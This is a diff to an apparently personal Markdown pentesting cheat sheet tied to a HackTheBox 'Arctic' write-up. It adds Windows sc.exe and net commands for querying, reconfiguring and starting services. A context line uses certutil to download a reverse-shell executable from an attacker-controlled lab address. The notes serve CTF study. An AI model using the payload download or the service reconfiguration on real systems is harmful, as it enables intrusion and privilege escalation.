@@ -16,5 +16,30 @@ https://www.absolomb.com/2017-12-29-HackTheBox-Arctic-Writeup/
 
 certutil.exe -urlcache -split -f http://10.10.14.33:8888/reverse.exe reverse.exe
 
+## Windows service commands
 
+Query the configuration of a service
 
+```
+> sc.exe qc <name>
+```
+
+Query the current status of a service
+
+```
+> sc.exe query <name>
+```
+
+Modify configuraton  option of a service
+
+```
+> sc.exe config <name> <option>= <value>
+```
+
+Start/Stop a service
+
+```
+> net start/stop <name>
+```
+
+```
